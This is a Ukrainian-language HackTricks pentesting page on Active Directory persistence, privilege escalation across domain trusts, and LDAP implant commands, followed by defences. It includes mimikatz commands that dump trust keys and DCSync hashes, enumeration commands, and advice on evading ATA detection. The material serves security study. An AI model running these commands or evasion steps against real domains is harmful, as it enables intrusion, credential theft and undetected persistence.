### AdminSDHolder Group

Об'єкт **AdminSDHolder** в Active Directory забезпечує безпеку **привілейованих груп** (наприклад, Domain Admins та Enterprise Admins), застосовуючи стандартний **ACL** до цих груп, щоб запобігти несанкціонованим змінам. Однак ця функція може бути використана зловмисниками; якщо атакуючий змінить ACL AdminSDHolder, давши повний доступ звичайному користувачу, цей користувач отримає широкий контроль над усіма привілейованими групами. Цей захід безпеки, призначений для захисту, може обернутися проти організації, якщо його не моніторити ретельно.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

У кожному **Domain Controller (DC)** існує локальний обліковий запис адміністратора. Отримавши права адміністратора на такій машині, хеш локального Administrator можна витягти за допомогою **mimikatz**. Після цього необхідно змінити реєстр, щоб **дозволити використання цього пароля**, що дозволяє віддалений доступ до локального облікового запису Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **надати** деякому **користувачу спеціальні права** над певними об'єктами домену, що дозволить цьому користувачу **підвищити привілеї в майбутньому**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **збереження** **пермісій**, які має **об'єкт** відносно іншого об'єкта. Якщо ви зробите хоча б **невелику зміну** в **security descriptor** об'єкта, ви можете отримати дуже цікаві привілеї над цим об'єктом, не будучи членом привілейованої групи.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Зловживайте допоміжним класом `dynamicObject`, щоб створювати короткоживучі principals/GPOs/DNS записи з `entryTTL`/`msDS-Entry-Time-To-Die`; вони самостійно видаляються без tombstones, стираючи LDAP-дані як докази, залишаючи orphan SIDs, зламані `gPLink` посилання або кешовані DNS-відповіді (наприклад, AdminSDHolder ACE pollution або шкідливі `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** в пам'яті, щоб встановити **універсальний пароль**, що надає доступ до всіх доменних облікових записів.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити свій **власний SSP**, щоб **захоплювати** у **clear text** **credentials**, які використовуються для доступу до машини.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Реєструє **новий Domain Controller** в AD і використовує його для **push attributes** (SIDHistory, SPNs...) на вказані об'єкти **без** залишення логів про **зміни**. Потрібні DA привілеї і доступ до **root domain**.\
Зверніть увагу, що якщо ви використаєте неправильні дані, з'являться досить помітні логи.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як підвищити привілеї, маючи **достатні права для читання LAPS паролів**. Однак ці паролі також можуть бути використані для **підтримки персистенції**.\
Див.:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як межу безпеки. Це означає, що **компрометація одного домену може призвести до компрометації всього Forest**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, який дозволяє користувачу з одного **домену** отримувати доступ до ресурсів в іншому **домені**. По суті, він створює зв'язок між системами аутентифікації двох доменів, дозволяючи перевіркам аутентифікації проходити безперебійно. Коли домени налаштовують trust, вони обмінюються і зберігають певні **keys** на своїх **Domain Controllers (DCs)**, які є критично важливими для цілісності довіри.

У типовому сценарії, якщо користувач бажає отримати доступ до сервісу в **trusted domain**, йому спочатку потрібно запросити спеціальний квиток, відомий як **inter-realm TGT**, від свого DC. Цей TGT шифрується спільним **key**, який обидва домени погодили. Користувач потім пред'являє цей TGT DC **trusted domain**, щоб отримати сервісний квиток (**TGS**). Після успішної перевірки inter-realm TGT DC trusted domain видає TGS, що дає користувачу доступ до сервісу.

**Кроки**:

1. **Client computer** в **Domain 1** починає процес, використовуючи свій **NTLM hash** для запиту **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо клієнт автентифікований успішно.
3. Клієнт потім запитує **inter-realm TGT** у DC1, який потрібен для доступу до ресурсів у **Domain 2**.
4. Inter-realm TGT шифрується **trust key**, який поділяють DC1 і DC2 як частину двостороннього domain trust.
5. Клієнт несе inter-realm TGT до **Domain 2's Domain Controller (DC2)**.
6. DC2 перевіряє inter-realm TGT за допомогою свого shared trust key і, якщо він дійсний, видає **Ticket Granting Service (TGS)** для сервера в Domain 2, до якого клієнт хоче отримати доступ.
7. Нарешті, клієнт пред'являє цей TGS серверу, який зашифрований хешем облікового запису сервера, щоб отримати доступ до сервісу в Domain 2.

### Different trusts

Важливо зауважити, що **trust може бути одностороннім або двостороннім**. У двосторонньому варіанті обидва домени довіряють один одному, але в **односторонньому** відносині один домен буде **trusted**, а інший — **trusting**. У цьому випадку **ви зможете отримувати доступ до ресурсів всередині trusting domain з trusted domain**.

Якщо Domain A довіряє Domain B, A є trusting domain, а B — trusted. Крім того, в **Domain A** це буде **Outbound trust**; а в **Domain B** — **Inbound trust**.

**Різні типи відносин довіри**

- **Parent-Child Trusts**: Поширена конфігурація в межах одного forest, де дочірній домен автоматично має двосторонню транзитивну довіру з батьківським доменом. Це означає, що запити аутентифікації можуть проходити вільно між батьком і дитиною.
- **Cross-link Trusts**: Звані також "shortcut trusts", встановлюються між дочірніми доменами для прискорення процесів рефералів. У складних лісах реферальні запити зазвичай повинні підніматися до кореня forest і потім спускатися до цільового домену. Cross-links скорочують цей шлях, що особливо корисно в географічно розподілених середовищах.
- **External Trusts**: Встановлюються між різними, не пов'язаними доменами і є не транзитивними за своєю природою. Згідно з [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до ресурсів у домені за межами поточного forest, який не пов'язаний forest trust. Безпека підсилюється через SID filtering при external trusts.
- **Tree-root Trusts**: Такі довіри автоматично встановлюються між кореневим доменом forest і новим tree root. Хоча зустрічаються нечасто, tree-root trusts важливі для додавання нових дерев доменів до forest, дозволяючи їм зберігати унікальне ім'я домену та забезпечуючи двосторонню транзитивність. Більше інформації можна знайти в [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Це двостороння транзитивна довіра між двома forest root доменами, також застосовується SID filtering для посилення заходів безпеки.
- **MIT Trusts**: Встановлюються з не-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos доменами. MIT trusts більш спеціалізовані і призначені для середовищ, які потребують інтеграції з Kerberos-системами поза Windows екосистемою.

#### Other differences in **trusting relationships**

- Відносини довіри також можуть бути **транзитивними** (A довіряє B, B довіряє C, отже A довіряє C) або **нетранзитивними**.
- Відносини довіри можуть бути налаштовані як **bidirectional trust** (обидва довіряють один одному) або як **one-way trust** (тільки один довіряє іншому).

### Attack Path

1. **Перелічити** trusting relationships
2. Перевірити, чи який-небудь **security principal** (user/group/computer) має **доступ** до ресурсів **іншого домену**, можливо через ACE entries або шляхом належності до груп іншого домену. Шукайте **відносини між доменами** (ймовірна причина створення trust).
1. kerberoast у цьому випадку теж може бути опцією.
3. **Скомпрометувати** **accounts**, які можуть **pivot** через домени.

Атакувальники можуть отримати доступ до ресурсів в іншому домені через три основні механізми:

- **Local Group Membership**: Принципали можуть бути додані до локальних груп на машинах, наприклад до групи “Administrators” на сервері, що дає їм значний контроль над тією машиною.
- **Foreign Domain Group Membership**: Принципали також можуть бути членами груп у чужому домені. Проте ефективність цього методу залежить від характеру довіри та області дії групи.
- **Access Control Lists (ACLs)**: Принципали можуть бути вказані в **ACL**, особливо як сутності в **ACEs** в **DACL**, надаючи їм доступ до конкретних ресурсів. Для тих, хто хоче глибше зануритися в механіку ACLs, DACLs і ACEs, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є безцінним ресурсом.

### Find external users/groups with permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у домені. Це будуть користувачі/групи з **зовнішнього домену/forest**.

Ви можете перевірити це в **Bloodhound** або використовуючи powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахувати довірчі відносини доменів:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існують **2 trusted keys**, один для _Child --> Parent_ і інший для _Parent_ --> _Child_.\
> Ви можете визначити, який із них використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ескалація до Enterprise admin у child/parent domain, зловживаючи довірою через SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Важливо розуміти, як може бути використаний Configuration Naming Context (NC). Configuration NC слугує центральним репозиторієм конфігураційних даних по всьому forest у середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у лісі, причому writable DCs мають записувану копію Configuration NC. Щоб експлуатувати це, потрібно мати **SYSTEM privileges on a DC**, бажано на child DC.

**Link GPO to root DC site**

Container Sites Configuration NC містить інформацію про sites усіх комп’ютерів, приєднаних до домену, у AD forest. Маючи SYSTEM privileges на будь‑якому DC, нападники можуть link GPOs до root DC sites. Це потенційно може скомпрометувати root domain шляхом маніпуляції політиками, які застосовуються до цих sites.

Для детальнішої інформації перегляньте дослідження на [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Вектор атаки полягає у націленні на привілейовані gMSA в домені. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь‑якому DC, можна отримати доступ до KDS Root key і обчислити паролі для будь‑якого gMSA по всьому forest.

Детальний аналіз і покрокове керівництво можна знайти в:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Доповнювальна delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткові зовнішні дослідження: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Цей метод вимагає терпіння — очікування створення нових привілейованих AD об’єктів. Маючи SYSTEM privileges, атакуючий може змінити AD Schema, щоб надати будь‑якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD об’єктами.

Детальніше можна прочитати у [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Уразливість ADCS ESC5 націлена на контроль над об’єктами Public Key Infrastructure (PKI) для створення шаблону сертифіката, який дозволяє автентифікуватися як будь‑який користувач у forest. Оскільки PKI objects розташовані в Configuration NC, компрометація writable child DC дає змогу виконати ESC5 атаки.

Більше деталей див. у [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). У сценаріях без ADCS атакуючий має можливість налаштувати необхідні компоненти, як обговорюється в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **ваш домен отримав довіру** від зовнішнього, що дає вам **невизначені права** над ним. Вам потрібно буде з'ясувати, **які principals вашого домену мають який доступ до зовнішнього домену**, а потім спробувати це експлуатувати:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **ваш домен** **довіряє** деякі **привілеї** принципалу з **інших доменів**.

Однак, коли **домен стає довіреним** для довірливого домену, довірений домен **створює користувача** з **передбачуваною назвою**, у якого як **пароль використовується пароль довіри**. Це означає, що можливо **отримати доступ до користувача з довірливого домену, щоб зайти в довірений** та перелічити його об'єкти й намагатися підвищити привілеї:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб скомпрометувати довірений домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **протилежному напрямку** довірчого зв'язку доменів (що трапляється не дуже часто).

Ще один спосіб скомпрометувати довірений домен — чекати на машині, куди **користувач з довіреного домену може підключитися** через **RDP**. Потім атакуючий може інжектувати код у процес RDP-сесії та **отримати доступ до початкового домену жертви** звідти.\ Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ризик атак, що зловживають атрибутом SID history через міжлісові довіри, пом'якшується завдяки SID Filtering, який за замовчуванням увімкнений на всіх міжлісових довірах. Це базується на припущенні, що внутрілісові довіри безпечні — Microsoft розглядає ліс (forest), а не домен, як межу безпеки.
- Однак є нюанс: SID Filtering може порушити роботу додатків і доступ користувачів, що інколи призводить до його тимчасового відключення.

### **Selective Authentication:**

- Для міжлісових довір застосування Selective Authentication гарантує, що користувачі з двох лісів не автентифікуються автоматично. Замість цього потрібні явні дозволи, щоб користувачі могли отримати доступ до доменів і серверів у довірливому домені або лісі.
- Важливо зазначити, що ці заходи не захищають від експлуатації записуваного Configuration Naming Context (NC) або атак на trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. Весь трафік використовує поточний контекст безпеки входу по LDAP (389) з signing/sealing або LDAPS (636) з автоматичним довір'ям сертифікатів, тож не потрібні socks proxies чи артефакти на диску.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` розв'язують короткі імена/шляхи OU у повні DNs і вивантажують відповідні об'єкти.
- `get-object`, `get-attribute`, and `get-domaininfo` витягують довільні атрибути (включно з дескрипторами безпеки) та метадані forest/domain з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` виявляють roasting candidates, налаштування делегування та існуючі [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) дескриптори безпосередньо з LDAP.
- `get-acl` and `get-writable --detailed` розбирають DACL, щоб перерахувати trustees, права (GenericAll/WriteDACL/WriteOwner/attribute writes) та наслідування, надаючи негайні цілі для ескалації привілеїв через ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Примітиви запису LDAP для ескалації та персистентності

- BOF для створення об'єктів (`add-user`, `add-computer`, `add-group`, `add-ou`) дозволяють оператору розгортати нові облікові записи користувачів або комп'ютерів у будь-якому OU, де є права. `add-groupmember`, `set-password`, `add-attribute`, та `set-attribute` безпосередньо захоплюють цілі після отримання write-property rights.
- Команди, орієнтовані на ACL, такі як `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, та `add-dcsync` транслюють WriteDACL/WriteOwner на будь-якому AD-об'єкті в скидання паролів, контроль членства в групах або привілеї DCSync без залишення PowerShell/ADSI артефактів. `remove-*` відповідники прибирають інжектовані ACE.

### Делегація, roasting і зловживання Kerberos

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача Kerberoastable; `add-asreproastable` (перемикач UAC) позначає його для AS-REP roasting без торкання пароля.
- Делегаційні макроси (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, прапори UAC або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon, дозволяючи шляхи атак constrained/unconstrained/RBCD та усуваючи потребу в remote PowerShell або RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` впроваджує привілейовані SIDs у SID history контрольованого принципала (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп'ютерів або користувачів, дозволяючи нападнику перемістити активи в OUs, де вже існують делеговані права, перед тим як зловживати `set-password`, `add-groupmember` або `add-spn`.
- Тісно зорієнтовані команди видалення (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дозволяють швидко відкотити зміни після того, як оператор зібрав облікові дані або встановив персистентність, мінімізуючи телеметрію.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Деякі загальні заходи захисту

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Заходи захисту облікових даних**

- **Domain Admins Restrictions**: Рекомендується дозволяти Domain Admins увійти лише на Domain Controllers, уникаючи їх використання на інших хостах.
- **Service Account Privileges**: Сервіси не повинні запускатися з привілеями Domain Admin (DA) для підтримки безпеки.
- **Temporal Privilege Limitation**: Для завдань, що вимагають прав DA, їх тривалість слід обмежувати. Це можна реалізувати за допомогою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Аудитуйте Event IDs 2889/3074/3075, а потім застосуйте LDAP signing та LDAPS channel binding на DCs/клієнтах, щоб заблокувати LDAP MITM/relay спроби.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Реалізація технік обману**

- Реалізація deception включає встановлення пасток, як-от підставні користувачі або комп'ютери, з властивостями такими як паролі, що не закінчуються, або позначені як Trusted for Delegation. Детальний підхід включає створення користувачів з конкретними правами або додавання їх до груп з високими привілеями.
- Практичний приклад включає використання інструментів: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше про розгортання deception технік можна знайти на [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення обману**

- **For User Objects**: Підозрілі індикатори включають нетиповий ObjectSID, рідкісні логони, дати створення та низьку кількість невдалих спроб пароля.
- **General Indicators**: Порівняння атрибутів потенційних підставних об'єктів з атрибутами справжніх може виявити невідповідності. Інструменти, такі як [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster), можуть допомогти у виявленні таких пасток.

### **Обхід систем виявлення**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Уникання переліку сесій на Domain Controllers, щоб запобігти виявленню ATA.
- **Ticket Impersonation**: Використання **aes**-ключів для створення квитків допомагає обходити виявлення, не понижуючи до NTLM.
- **DCSync Attacks**: Рекомендується виконувати з не-Domain Controller, щоб уникнути виявлення ATA, оскільки виконання безпосередньо з Domain Controller спричинить сповіщення.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
